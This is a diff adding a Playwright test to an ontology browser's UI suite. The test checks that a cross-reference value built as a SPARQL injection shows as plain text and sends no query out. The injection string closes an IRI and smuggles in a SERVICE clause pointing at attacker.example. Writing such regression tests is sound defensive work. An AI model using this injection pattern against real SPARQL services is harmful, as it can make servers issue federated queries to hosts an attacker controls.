@@ -830,6 +830,41 @@ test('typed literals read as their value with a datatype chip, and copy as synta
   expect(copied).not.toContain('datatype');
 });
 
+test('a cross-reference that closes an IRI is plain text and reaches no query', async ({
+  page,
+}) => {
+  const attack =
+    'http://example.org/x> } SERVICE <https://attacker.example/sparql> { ?s ?p ?d } } #';
+  await page.route(/\/\$\/ontology\/cells\/term\?/, async (route) => {
+    const res = await route.fetch();
+    const t = await res.json();
+    t.statements = [
+      ...t.statements,
+      {
+        property: 'http://www.geneontology.org/formats/oboInOwl#hasDbXref',
+        value: { '@value': attack },
+        graph: t.statements[0]?.graph ?? '',
+        annotations: [],
+      },
+    ];
+    await route.fulfill({ response: res, json: t });
+  });
+  const sent: string[] = [];
+  page.on('request', (r) => sent.push(`${r.url()} ${r.postData() ?? ''}`));
+  await page.goto(HEAVY);
+  const ids = page.getByRole('region', { name: 'Identifiers' });
+  await expect(ids.getByText(attack, { exact: true })).toBeVisible({ timeout: 30_000 });
+  await expect(ids.getByRole('link', { name: /attacker/ })).toHaveCount(0);
+  // the others still get their labels from the one query
+  await expect(ids.getByRole('link', { name: 'antigen-presenting border cell' })).toBeVisible();
+  await page.waitForLoadState('networkidle');
+  expect(
+    sent
+      .filter((s) => /SERVICE|attacker/.test(decodeURIComponent(s.replace(/\+/g, ' '))))
+      .filter((s) => !s.includes('/term?')),
+  ).toEqual([]);
+});
+
 test('a concept keeps its hidden labels behind their toggle', async ({ page }) => {
   const concept = (l: string) =>
     `/ui/browse?ds=thes&iri=${encodeURIComponent(`http://example.org/thesaurus/${l}`)}`;
